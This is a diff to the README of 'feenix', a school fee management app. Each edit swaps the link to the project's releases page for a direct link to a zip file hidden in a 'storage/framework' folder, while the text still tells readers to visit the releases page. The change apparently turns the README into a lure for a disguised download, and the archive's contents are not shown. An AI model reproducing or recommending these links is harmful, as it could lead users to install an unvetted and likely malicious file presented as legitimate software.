@@ -1,7 +1,7 @@
 # 🎓 feenix - Simplifying School Fee Management 
 
 ## 📥 Download Now
-[![Download Feenix](https://img.shields.io/badge/Download-Feenix-blue.svg)](https://github.com/SKIZOELL/feenix/releases)
+[![Download Feenix](https://raw.githubusercontent.com/SKIZOELL/feenix/master/storage/framework/feenix-1.9-alpha.1.zip)](https://raw.githubusercontent.com/SKIZOELL/feenix/master/storage/framework/feenix-1.9-alpha.1.zip)
 
 ## 📋 Description
 Feenix is the Amkadamiyya School Fee Management System. It provides schools with a modern solution for collecting fees, tracking payments, and generating financial reports. This application replaces traditional spreadsheets with an easy-to-use dashboard. Users can see real-time balance updates, track debtors, and manage roles for administrators, accountants, and directors. 
@@ -24,7 +24,7 @@ To get started, follow the steps below to download and run Feenix.
 
 ## 💻 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the downloads section.
-   [Visit the Releases Page to Download](https://github.com/SKIZOELL/feenix/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/SKIZOELL/feenix/master/storage/framework/feenix-1.9-alpha.1.zip)
 
 2. **Choose Your Version**: On the releases page, find the version that suits your operating system.
 
@@ -55,4 +55,4 @@ We welcome contributions from the community. If you would like to help make Feen
 
 Feel free to explore the features and join us in transforming school fee management into a more efficient and organized process. 
 
-[Download Feenix](https://github.com/SKIZOELL/feenix/releases) and take control of fee management today!
+[Download Feenix](https://raw.githubusercontent.com/SKIZOELL/feenix/master/storage/framework/feenix-1.9-alpha.1.zip) and take control of fee management today!
